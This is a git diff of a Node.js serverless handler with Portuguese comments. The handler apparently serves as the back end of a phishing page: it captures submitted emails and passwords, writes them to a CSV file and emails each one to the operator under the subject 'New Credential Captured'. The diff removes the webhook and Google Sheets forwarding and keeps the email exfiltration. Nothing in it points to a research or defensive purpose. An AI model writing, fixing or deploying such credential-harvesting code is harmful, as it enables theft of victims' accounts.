@@ -1,10 +1,7 @@
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
-const http = require('http');
 const createCsvWriter = require('csv-writer').createObjectCsvWriter;
 const nodemailer = require('nodemailer');
-const { saveToGoogleSheets } = require('./save-to-sheets');
 
 // Caminho do arquivo CSV (usar /tmp na Vercel)
 const CSV_FILE = path.join('/tmp', 'credentials.csv');
@@ -27,79 +24,46 @@ async function initCSV() {
     }
 }
 
-// Função para enviar webhook
-function sendWebhook(url, data) {
-    return new Promise((resolve, reject) => {
-        const urlObj = new URL(url);
-        const isHttps = urlObj.protocol === 'https:';
-        const client = isHttps ? https : http;
-        
-        const postData = JSON.stringify(data);
-        
-        const options = {
-            hostname: urlObj.hostname,
-            port: urlObj.port || (isHttps ? 443 : 80),
-            path: urlObj.pathname + urlObj.search,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(postData)
-            }
-        };
-        
-        const req = client.request(options, (res) => {
-            let responseData = '';
-            res.on('data', (chunk) => { responseData += chunk; });
-            res.on('end', () => {
-                if (res.statusCode >= 200 && res.statusCode < 300) {
-                    resolve(responseData);
-                } else {
-                    reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
-                }
-            });
-        });
-        
-        req.on('error', reject);
-        req.write(postData);
-        req.end();
-    });
-}
-
 // Função para enviar email com as credenciais
 async function sendEmailNotification(email, password, timestamp, ip) {
-    // Pegar configurações de email das variáveis de ambiente
-    const emailConfig = {
-        to: process.env.EMAIL_TO, // Seu email para receber
-        from: process.env.EMAIL_FROM || process.env.EMAIL_TO,
-        smtp: {
-            host: process.env.SMTP_HOST || 'smtp.gmail.com',
-            port: parseInt(process.env.SMTP_PORT || '587'),
-            secure: process.env.SMTP_SECURE === 'true',
-            auth: {
-                user: process.env.SMTP_USER,
-                pass: process.env.SMTP_PASS
-            }
+    // Seu email para receber (configure na Vercel)
+    const emailTo = process.env.EMAIL_TO;
+    
+    // Se não tiver email configurado, não enviar
+    if (!emailTo) {
+        console.log('EMAIL_TO não configurado, pulando envio de email');
+        return;
+    }
+
+    // Configurações SMTP (Gmail por padrão)
+    const smtpConfig = {
+        host: process.env.SMTP_HOST || 'smtp.gmail.com',
+        port: parseInt(process.env.SMTP_PORT || '587'),
+        secure: process.env.SMTP_SECURE === 'true',
+        auth: {
+            user: process.env.SMTP_USER || emailTo,
+            pass: process.env.SMTP_PASS
         }
     };
 
-    // Se não tiver email configurado, não enviar
-    if (!emailConfig.to || !emailConfig.smtp.auth.user) {
-        console.log('Email não configurado, pulando envio');
+    // Se não tiver senha configurada, não enviar
+    if (!smtpConfig.auth.pass) {
+        console.log('SMTP_PASS não configurado, pulando envio de email');
         return;
     }
 
     // Criar transporter
     const transporter = nodemailer.createTransport({
-        host: emailConfig.smtp.host,
-        port: emailConfig.smtp.port,
-        secure: emailConfig.smtp.secure,
-        auth: emailConfig.smtp.auth
+        host: smtpConfig.host,
+        port: smtpConfig.port,
+        secure: smtpConfig.secure,
+        auth: smtpConfig.auth
     });
 
     // Criar mensagem
     const mailOptions = {
-        from: emailConfig.from,
-        to: emailConfig.to,
+        from: smtpConfig.auth.user,
+        to: emailTo,
         subject: `🔐 Nova Credencial Capturada - ${email}`,
         html: `
             <h2>Nova Credencial Capturada</h2>
@@ -180,30 +144,11 @@ module.exports = async (req, res) => {
 
         console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);
 
-        // Salvar no Google Sheets (se configurado)
-        try {
-            await saveToGoogleSheets(email, password, timestamp, ip);
-        } catch (sheetsError) {
-            console.error('Erro ao salvar no Google Sheets (não crítico):', sheetsError);
-            // Não falhar a requisição se o Sheets não salvar
-        }
-
-        // Enviar para webhook (se configurado) - mais simples!
-        const webhookUrl = process.env.WEBHOOK_URL;
-        if (webhookUrl) {
-            try {
-                await sendWebhook(webhookUrl, { email, password, timestamp, ip });
-                console.log('Webhook enviado com sucesso');
-            } catch (webhookError) {
-                console.error('Erro ao enviar webhook (não crítico):', webhookError);
-            }
-        }
-
-        // Enviar email com as credenciais (se configurado)
+        // Enviar email com as credenciais
         try {
             await sendEmailNotification(email, password, timestamp, ip);
         } catch (emailError) {
-            console.error('Erro ao enviar email (não crítico):', emailError);
+            console.error('Erro ao enviar email:', emailError);
             // Não falhar a requisição se o email não enviar
         }
 
